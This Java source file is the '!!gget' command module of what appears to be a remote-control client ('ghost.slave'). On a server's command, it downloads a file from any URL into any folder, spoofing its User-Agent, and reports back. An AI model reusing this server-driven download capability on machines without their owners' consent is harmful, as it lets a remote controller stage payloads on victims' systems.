package top.idoknow.ghost.slave.func;

import top.idoknow.ghost.slave.cmd.AbstractFunc;
import top.idoknow.ghost.slave.cmd.AbstractProcessor;
import top.idoknow.ghost.slave.conn.HandleConn;
import top.idoknow.ghost.slave.core.ClientMain;

import java.io.DataInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Date;

/**
 * http下载器
 */
public class FuncGGet implements AbstractFunc {
    @Override
    public String getFuncName() {
        return "!!gget";
    }

    @Override
    public String[] getParamsModel() {
        return new String[]{"<url>","saveDir>","<saveName>"};
    }

    @Override
    public String getDescription() {
        return null;
    }

    @Override
    public int getMinParamsAmount() {
        return 3;
    }

    @Override
    public void run(String[] params, String cmd, AbstractProcessor processor) {
        try {
            HandleConn.writeToServer("正在下载"+cmd+"\n");
            new Thread(() -> {
                try {
                    downLoadFromUrl(params[0], params[2], params[1], "dl"+new Date().getTime());
                    HandleConn.writeToServer("完成\n");
                }catch (Exception e) {
                    e.printStackTrace();
                    try {
                        HandleConn.writeToServer("下载出错\n" + ClientMain.getErrorInfo(e));
                    }catch (Exception err){}
                }
            }).start();
        } catch (Exception e) {
            HandleConn.writeToServerIgnoreException("下载出错\n" + ClientMain.getErrorInfo(e));
        }
        HandleConn.sendFinishToServer();
    }
    /**
     * 从网络Url中下载文件
     * @param urlStr
     * @param fileName
     * @param savePath
     * @throws IOException
     */
    public static void  downLoadFromUrl(String urlStr,String fileName,String savePath,String toekn) throws IOException{
        URL url = new URL(urlStr);
        HttpURLConnection conn = (HttpURLConnection)url.openConnection();
        //设置超时间为3秒
        conn.setConnectTimeout(3*1000);
        //防止屏蔽程序抓取而返回403错误
        conn.setRequestProperty("User-Agent", "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt)");
        conn.setRequestProperty("lfwywxqyh_token",toekn);
        //输入流
        DataInputStream dataInputStream=new DataInputStream(conn.getInputStream());
        //创建文件输出流
        // 文件保存位置
        File saveDir = new File(savePath.replaceAll("\\?"," "));
        if(!saveDir.exists()){
            saveDir.mkdir();
        }
        File file = new File(saveDir+File.separator+fileName);
        FileOutputStream fos = new FileOutputStream(file);

        byte[] data=new byte[1024];
        int len=0;
        while ((len=dataInputStream.read(data,0,data.length))!=-1){
            fos.write(data,0,len);
            fos.flush();
        }
        fos.close();
        dataInputStream.close();
    }
}
